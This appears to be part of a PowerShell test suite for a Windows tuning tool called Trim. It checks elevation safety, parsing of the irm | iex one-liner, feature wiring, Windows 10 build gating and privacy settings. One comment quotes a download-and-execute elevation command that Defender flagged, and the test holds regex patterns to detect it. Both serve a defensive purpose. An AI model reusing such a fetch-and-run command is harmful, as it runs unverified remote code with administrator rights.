                $problems.Add("$k ($($named[$k])) is $r`:1 on $bg - under AA for body text") | Out-Null
            }
        }
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'Elevation never downloads and executes' {
    # Microsoft Defender flagged Trojan:Win32/Commando.A!ml on this command
    # line - a detection on the command line, not on any file:
    #
    #   pwsh -ExecutionPolicy Bypass -NoProfile -NoExit -Command
    #        &([ScriptBlock]::Create((irm 'https://trimbloat.com/go')))
    #
    # It is also unsafe on its own terms: it fetches again inside the elevated
    # process and runs whatever comes back, so what receives administrator is
    # not provably what the user read. There were two such call sites.
    $problems = [System.Collections.Generic.List[string]]::new()

    foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1')) {
        $lines = Get-Content -LiteralPath $f.FullName
        $inHelp = $false
        for ($i = 0; $i -lt $lines.Count; $i++) {
            $line = $lines[$i]
            # Comment-based help quotes the exact pattern this guard looks for,
            # in the course of explaining why it is gone.
            if ($line -match '<#') { $inHelp = $true }
            if ($inHelp) { if ($line -match '#>') { $inHelp = $false }; continue }
            if ($line -match '^\s*#') { continue }
            # The winutil handoff is a documented, deliberate execution of a
            # third-party script; it is not an elevation command line.
            if ($line -match 'WinUtilSource') { continue }
            if ($line -match "ScriptBlock\]::Create\(\(\s*irm" -or
                $line -match "ScriptBlock\]::Create\(\(Invoke-RestMethod") {
                if ($line -notmatch 'WinUtilSource') {
                    $problems.Add("$($f.Name) line $($i + 1) builds a download-and-execute command") | Out-Null
                }
            }
        }
    }

    # Every elevation must hand over a file and a hash to check it against.
    $head = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '01-header.ps1')
    $main = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '99-main.ps1')
    foreach ($pair in @(@{ N = '01-header.ps1'; T = $head }, @{ N = '99-main.ps1'; T = $main })) {
        if ($pair.T -match "Start-Process \`$shell -Verb RunAs" -and $pair.T -notmatch 'ElevationHash') {
            $problems.Add("$($pair.N) elevates without pinning a hash") | Out-Null
        }
    }
    if ($main -notmatch 'Get-StagedSelf' -or $head -notmatch 'function Get-StagedSelf') {
        $problems.Add('the staged-self helper is missing from an elevation path') | Out-Null
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'The one-liner actually works' {
    # This shipped broken. `irm | iex` is how essentially everyone runs this,
    # and it failed on the very first statement:
    #     Invoke-Expression: Unexpected attribute 'CmdletBinding'.
    # Invoke-RestMethod passes a UTF-8 byte order mark through as a literal
    # U+FEFF, and Invoke-Expression cannot parse a script starting with one.
    # Everything else passed, because the build parsed the artefact from disk
    # where the mark is a mark rather than a character.
    $artefact = Join-Path $root 'trim.ps1'
    if (-not (Test-Path -LiteralPath $artefact)) { throw 'trim.ps1 has not been built' }

    $problems = [System.Collections.Generic.List[string]]::new()

    $bytes = [System.IO.File]::ReadAllBytes($artefact)
    if ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) {
        $problems.Add('the artefact starts with a UTF-8 BOM, which breaks irm | iex') | Out-Null
    }

    # No BOM is only safe while the file is pure ASCII; anything else needs one
    # to survive being saved and re-read under Windows PowerShell.
    $text = [System.IO.File]::ReadAllText($artefact)
    $nonAscii = @($text.ToCharArray() | Where-Object { [int]$_ -gt 127 })
    if ($nonAscii.Count) {
        $seen = ($nonAscii | Select-Object -Unique -First 5 | ForEach-Object { 'U+{0:X4}' -f [int]$_ }) -join ', '
        $problems.Add("the artefact has $($nonAscii.Count) non-ASCII character(s) ($seen) so it would need a BOM") | Out-Null
    }

    # The failing operation itself: build a script block from the text exactly
    # as Invoke-Expression would.
    try { $null = [scriptblock]::Create($text) }
    catch { $problems.Add("iex cannot parse the artefact: $($_.Exception.Message)") | Out-Null }

    # And confirm the guard still detects the original fault.
    try {
        $null = [scriptblock]::Create(([string][char]0xFEFF) + $text)
        $problems.Add('a leading BOM no longer breaks parsing - this test can no longer detect the fault') | Out-Null
    } catch { }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'Every feature is reachable' {
    # Get-LargeFileScan shipped as dead code: written, unit-checked in isolation,
    # wired to nothing, and reported as delivered. This asserts that anything
    # presented as a feature can actually be reached, from the window or the
    # command line.
    $problems = [System.Collections.Generic.List[string]]::new()

    $gui  = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '13-gui.ps1')
    $main = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '99-main.ps1')
    $head = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '01-header.ps1')
    $all  = ($gui + $main + $head)

    # Each entry: the function, and where a caller has to exist.
    $reachable = @(
        @{ Name = 'Get-LargeFileScan';  In = $all;  Where = 'the window or the command line' },
        @{ Name = 'Get-DuplicateScan';  In = $all;  Where = 'the window or the command line' },
        @{ Name = 'Get-StartupItems';   In = $all;  Where = 'the window' },
        @{ Name = 'Disable-StartupItem';In = $gui;  Where = 'the window' },
        @{ Name = 'Get-CleanupScan';    In = $all;  Where = 'the window or the command line' }
    )
    foreach ($r in $reachable) {
        if ($r.In -notmatch [regex]::Escape($r.Name)) {
            $problems.Add("$($r.Name) is never called from $($r.Where)") | Out-Null
        }
    }

    # A switch nobody reads is the same fault wearing a different hat.
    foreach ($sw in @('LargeFiles', 'IncludeDuplicates', 'Cleanup')) {
        if ($main -notmatch "\`$$sw") {
            $problems.Add("-$sw is declared but 99-main never reads it") | Out-Null
        }
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'Windows 10 gating' {
    # The site tells Windows 10 users that Trim "skips whatever does not apply
    # to your build". For a long time nothing gated on the OS at all - it warned
    # and then wrote Windows 11 keys anyway. This asserts the claim is true.
    $problems = [System.Collections.Generic.List[string]]::new()

    # 1. The fact exists and agrees with the build number.
    $f = Get-MachineFacts
    if ($null -eq $f.PSObject.Properties['IsWindows11']) {
        $problems.Add('Get-MachineFacts does not report IsWindows11') | Out-Null
    } elseif ($f.IsWindows11 -ne ($f.OSBuild -ge 22000)) {
        $problems.Add("IsWindows11=$($f.IsWindows11) disagrees with build $($f.OSBuild)") | Out-Null
    }

    # 2. Every setting known to be Windows 11 only carries a gate.
    $needsGate = @(
        'Start_IrisRecommendations', 'TaskbarDa', 'AllowNewsAndInterests',
        'BackgroundType', 'EnableSnapAssistFlyout'
    )
    $srcText = @{}
    foreach ($file in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1')) {
        $srcText[$file.Name] = Get-Content -Raw -Encoding UTF8 -LiteralPath $file.FullName
    }
    foreach ($key in $needsGate) {
        $found = $false
        foreach ($name in $srcText.Keys) {
            foreach ($line in ($srcText[$name] -split "`r?`n")) {
                if ($line -match [regex]::Escape($key) -and $line -match 'Set-Reg|Remove-Reg') {
                    $found = $true
                    # The gate may sit on the continuation line, so test the
                    # whole statement rather than just the line the key is on.
                    $stmt = $line
                    if ($line.TrimEnd().EndsWith('`')) {
                        $idx = ($srcText[$name] -split "`r?`n").IndexOf($line)
                        $stmt += ' ' + ($srcText[$name] -split "`r?`n")[$idx + 1]
                    }
                    if ($stmt -notmatch 'MinBuild|MaxBuild') {
                        $problems.Add("$key is written with no build gate ($name)") | Out-Null
                    }
                }
            }
        }
        if (-not $found) { $problems.Add("$key is no longer written anywhere - update this test") | Out-Null }
    }

    # 3. The gate actually refuses. Drive it directly rather than trusting that
    #    passing the parameter is the same as it being honoured.
    $saved = $script:MachineFacts
    try {
        $script:MachineFacts = [pscustomobject]@{ OSBuild = 19045 }   # Windows 10 22H2
        if (Test-BuildApplies -MinBuild 22000 -What 'test') {
            $problems.Add('Test-BuildApplies allowed a Windows 11-only change on build 19045') | Out-Null
        }
        if (-not (Test-BuildApplies -MaxBuild 21999 -What 'test')) {
            $problems.Add('Test-BuildApplies refused a Windows 10-only change on build 19045') | Out-Null
        }
        $script:MachineFacts = [pscustomobject]@{ OSBuild = 26100 }   # Windows 11 24H2
        if (-not (Test-BuildApplies -MinBuild 22000 -What 'test')) {
            $problems.Add('Test-BuildApplies refused a Windows 11 change on build 26100') | Out-Null
        }
        if (Test-BuildApplies -MaxBuild 21999 -What 'test') {
            $problems.Add('Test-BuildApplies allowed a Windows 10-only change on build 26100') | Out-Null
        }
    } finally {
        $script:MachineFacts = $saved
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'Privacy carve-out guard' {
    foreach ($c in @('webcam','microphone','graphicsCaptureProgrammatic','graphicsCaptureWithoutBorder')) {
        if ($script:ConsentDeny -contains $c)        { throw "'$c' must never be in the deny list" }
        if ($script:ConsentNeverTouch -notcontains $c) { throw "'$c' must be in the never-touch list" }
    }
}

Write-Host ''
if ($failures.Count -eq 0) {
    Write-Host "All checks passed. Log: $($script:LogPath)" -ForegroundColor Green
    exit 0
} else {
    Write-Host "$($failures.Count) failure(s):" -ForegroundColor Red
    foreach ($f in $failures) { Write-Host "  - $f" -ForegroundColor Red }
    exit 1
}
